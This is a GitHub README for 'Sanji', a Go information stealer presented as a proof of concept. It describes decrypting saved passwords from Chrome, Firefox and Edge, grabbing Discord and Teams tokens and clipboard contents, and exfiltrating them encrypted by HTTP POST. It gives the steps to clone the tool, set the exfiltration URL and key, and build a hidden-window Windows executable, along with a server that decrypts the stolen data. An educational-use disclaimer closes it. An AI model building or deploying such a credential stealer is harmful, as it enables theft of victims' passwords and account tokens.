<head>
<h1 align=center>Sanji - Browser & Token Grabber</h1>
</head>

<p align="center">
  <img src="images/Sanji.gif" alt="Sanji"/>
</p>

Sanji is a proof-of-concept tool that can gather and decrypt password information saved in various web browsers, as well as authentication tokens from common instant messaging programs.

---

## Features

* Obtain decrypted credentials stored in the following web browsers:
    - Google Chrome
    - Mozilla FireFox
    - Microsoft Edge
* Gather authentication tokens from the following instant messaging platforms:
    - Discord
    - Microsoft Teams
* Capture the current contents of the clipboard
* Encrypt and exfiltrate data via an HTTP POST request
---
## Installation

Clone the repository:<br>
```git clone https://github.com/misthi0s/Sanji```

Modify the `POSTUrl` and `AESPassword` values in the `config.go` file to desired values.

For example, to encrypt the data with password `DiableJambe` and send it to a web server listening at `192.168.1.120` on port `8080`, modify the contents of `config.go` to the following:

```
	POSTUrl := "http://192.168.1.120:8080"
	AESPassword := "DiableJambe"
```

Finally, build the project with Go:<br>
```env GOOS=windows GOARCH=amd64 go build -ldflags "-w -s -H=windowsgui" -o sanji.exe .```

---
## Encrypted Data Format

The exfiltrated data is encrypted with AES GCM and sent using a specific format. The format is as follows:

<SALT (12 bytes)><IV (12 bytes)><ENCRYPTED_DATA>

The data is then converted to hex. This means that the first 24 characters the payload are the salt, the next 24 characters are the IV, and the rest is the encrypted data. To see an example of how this works, please refer to the `EncryptAES` function in the `utils\utils.go` file.

---
## Test Web Server

This repository contains a minimal web server that can be used to receive the encrypted data and decrypt it, displaying its contents to the screen. This server can be found in the `server_test` folder. To build this server, simply change to this directory and run the following build command:

```go build server_decrypt.go```

This will output a `server_decrypt.exe` file that will spin up the web server and listen for incoming requests.

The usage for this `server_decrypt.exe` program is as follows:

```server_decrypt.exe <listen_port> <decryption_passphrase>```

The `<listen_port>` and `<decryption_passphrase>` values must match the values configured in the payload's `config.go` file (the `<listen_port>` value only needs to be the actual port used for the connection, not the IP address as well).

---
## Disclaimer

This tool is a proof-of-concept to mimic a common information stealing malware in a controlled environment. It should only be used in an authorized manner against systems that are owned and controlled by the one executing it. There are no evasion techniques employed within this code and will very likely be caught by any AV or EDR product anyways. **FOR AUTHORIZED AND EDUCATIONAL PURPOSES ONLY.**

---
## Issues

If you run into any issues with Sanji, feel free to open an issue.